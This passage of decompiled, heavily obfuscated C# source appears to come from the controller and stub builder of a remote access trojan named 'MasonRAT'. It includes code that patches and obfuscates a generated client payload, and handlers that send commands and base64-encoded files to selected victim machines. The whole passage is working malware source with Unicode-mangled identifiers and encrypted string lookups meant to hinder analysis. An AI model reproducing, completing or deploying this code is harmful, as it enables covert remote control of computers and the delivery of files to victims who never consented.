\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> ((204193164 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1797), versionInfo.LegalTrademarks, Count: (-258178492 - (184161330 >> 504481467) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ ((1319835439 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) % (170657161 + 1846512615 % 554428044 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1798), Guid.NewGuid().ToString(), Count: (365075327 - 471085697 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + (1001088284 - 895077915 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) % (1050499849 - 670071784 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1799), versionInfo.FileMajorPart.ToString()).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1800), versionInfo.FileMinorPart.ToString()).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1801), versionInfo.FileBuildPart.ToString()).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1802), versionInfo.FilePrivatePart.ToString());
      }
      else
        Code = Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1803), (string) null, Count: (1518153960 + (981036144 << 278309078) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + -(384435376 + 1603480633 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1804), (string) null, Count: (-987189449 - 1279174546 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 > (-140314060 - ~718651875 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) ? 1622439622 - 1622439623 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 : (855816374 ^ -855816375) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1805), (string) null, Count: (1596634692 - ~357345910 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 > 1088047614 + 1576276548 % 399372112 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ? (-227 ^ 1903881662 >> 1125743447) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 : (-6 ^ 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1806), (string) null, Count: ((-190109588 ^ -677262441) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (-957117151 - 1250594250 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) % (1547374980 - 48035369 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1807), (string) null, Count: (1263266058 << 842891838) - 134515098 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - (-1500540620 - 793657104 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 | 1329091618 - 1228795327 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1808), (string) null, Count: 148115549 % 1309016419 - 898136684 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((-399820936 ^ ~996188809) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) % (-2021552688 - 336307567 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1809), Guid.NewGuid().ToString(), Count: ((-1672881341 ^ 323848590 % 1397960212) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - -(-810171086 - (1812715331 << 1617365579) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1810), Conversions.ToString(1)).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1811), Conversions.ToString(0)).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1812), Conversions.ToString(0)).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1813), Conversions.ToString(0));
      this.\u2694️MasonRAT\u270C\u0608ٺبــؤﻋــ\u0608ژ\u060Eـۡ\u060D\u060Eئڙـڼ(saveFileDialog2.FileName, Code);
      Debug.WriteLine(Obfuscator.Save(File.ReadAllBytes(saveFileDialog2.FileName), saveFileDialog2.FileName));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ۡﮪ̍ـٻٸ\u060Fڼؤٺ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1814));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u060A\u060Aڞاۙٺ\u060Aـﮪۙ(
    object sender,
    CancelEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u0609ۡٺ\u0608ـۧڇـټاۧڙـ\u0609ڙڇ\u060Aٻـۏ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـﯧٻۜ\u060Cـٺ\u060Dۜۨؤٺدټ̍ـ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڼٺب\u060A\u060Aڙڛ\u0609ىـ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cۚټ\u060Dـــﯧــگڕ\u060A\u060Fڜـ\u060A\u060B(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1815));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u0609ٸڙ\u060Aـ\u0609ڙـ\u0609ـﻋْ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      OpenFileDialog openFileDialog1 = new OpenFileDialog();
      OpenFileDialog openFileDialog2 = openFileDialog1;
      openFileDialog2.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1816);
      openFileDialog2.Title = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1817);
      if (openFileDialog1.ShowDialog() == DialogResult.OK)
      {
        string[] strArray = new string[(1516022135 - 1516022119 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ 1815217089 - 1815217068 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1818);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1813868736 - 955297473 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 > 163089062 - ~482248078 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? 536870914 /*0x20000002*/ - (306407716 << 836222203) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 : (4 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)] = Path.GetExtension(openFileDialog1.FileName);
        strArray[(163608335 + (530075497 >> 1667514090) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ ((2010453211 ^ 878212273 >> 670590916) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) % (1730221885 - (1401924324 | 1432209444) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(~1537087767 - 1083924168 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + ~((473265636 ^ (1550956799 | 1002593728)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = Convert.ToBase64String(File.ReadAllBytes(openFileDialog1.FileName));
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۧـ̍ــ\u060Aڙ\u0609ـۜــ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string DefaultResponse1 = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1819);
